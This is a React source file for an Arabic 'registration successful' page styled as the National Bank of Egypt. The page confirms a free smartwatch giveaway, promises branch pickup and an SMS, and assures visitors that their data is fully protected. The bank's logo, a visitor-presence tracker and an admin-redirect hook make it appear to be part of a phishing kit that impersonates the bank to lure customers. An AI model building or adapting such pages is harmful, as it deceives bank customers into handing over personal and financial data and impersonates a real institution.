/**
 * البنك الأهلي المصري - صفحة تم التسجيل
 * ثيم أبيض/أخضر مع شعار البنك خفيف بالخلفية
 */
import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function Registered() {
  const [, setLocation] = useLocation();
  const [showConfetti, setShowConfetti] = useState(true);
  usePresence("registered");
  useAdminRedirect();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  useEffect(() => {
    const timer = setTimeout(() => setShowConfetti(false), 4000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", position: "relative", overflow: "hidden" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      {/* Confetti */}
      {showConfetti && (
        <div style={{ position: "absolute", inset: 0, pointerEvents: "none" }}>
          {Array.from({ length: 20 }).map((_, i) => (
            <div
              key={i}
              
              
              
              style={{ position: "absolute", width: "8px", height: "8px", background: ["#1B7A3D", "#22c55e", "#3b82f6", "#d4a017", "#a78bfa"][i % 5], borderRadius: "2px" }}
            />
          ))}
        </div>
      )}
      <div style={{ maxWidth: "480px", width: "100%", padding: "32px 24px", textAlign: "center", position: "relative" }}>
        <div
          
          
          
          style={{ width: "100px", height: "100px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px", border: "3px solid #dcfce7" }}
        >
          <svg width="50" height="50" viewBox="0 0 24 24" fill="none">
            <path d="M20 6L9 17l-5-5" stroke="#1B7A3D" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <h1
          
          
          
          style={{ color: "#1a1a1a", fontSize: "28px", fontWeight: "800", marginBottom: "8px" }}
        >
          تم التسجيل بنجاح!
        </h1>
        <p
          
          
          
          style={{ color: "#666", fontSize: "15px", marginBottom: "32px" }}
        >
          مرحباً بك كعميل مميز في البنك الأهلي المصري. سيتم التواصل معك لتحديد موعد استلام ساعتك من الفرع
        </p>

        {/* Watch Image */}
        <div style={{ background: "#f8faf9", borderRadius: "20px", padding: "24px", marginBottom: "28px", border: "1px solid #dcfce7", boxShadow: "0 4px 20px rgba(27,122,61,0.08)" }}>
          <img
            src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]}
            alt="ساعتك الذكية"
            style={{ width: "150px", height: "150px", objectFit: "contain", margin: "0 auto 14px", display: "block", filter: "drop-shadow(0 8px 24px rgba(0,0,0,0.15))" }}
            onError={handleWatchImageError}
          />
          <p style={{ color: "#1B7A3D", fontWeight: "700", fontSize: "16px", margin: "0 0 4px" }}>ساعتك الذكية جاهزة</p>
          <p style={{ color: "#666", fontSize: "13px", margin: 0 }}>اللون: {WATCH_NAMES[watchColor] || watchColor}</p>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "12px", marginBottom: "32px" }}>
          {[
            { icon: "📍", text: "استلام ساعتك من أقرب فرع لك" },
            { icon: "📱", text: "سنتواصل معك قريباً عبر رسالة SMS" },
            { icon: "🔒", text: "بياناتك آمنة ومحمية بالكامل" },
          ].map((item, i) => (
            <div
              key={i}
              
              
              
              style={{ display: "flex", alignItems: "center", gap: "12px", padding: "14px 16px", background: "#fafafa", borderRadius: "12px", textAlign: "right", border: "1px solid #e5e7eb" }}
            >
              <span style={{ fontSize: "20px" }}>{item.icon}</span>
              <span style={{ color: "#333", fontSize: "14px" }}>{item.text}</span>
            </div>
          ))}
        </div>
        <button
          
          
          
          onClick={() => setLocation("/")}
          style={{ background: "#f0fdf4", color: "#1B7A3D", border: "1px solid #dcfce7", borderRadius: "12px", padding: "16px 40px", fontSize: "16px", fontWeight: "800", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
        >
          العودة للرئيسية
        </button>
      </div>
    </div>
  );
}
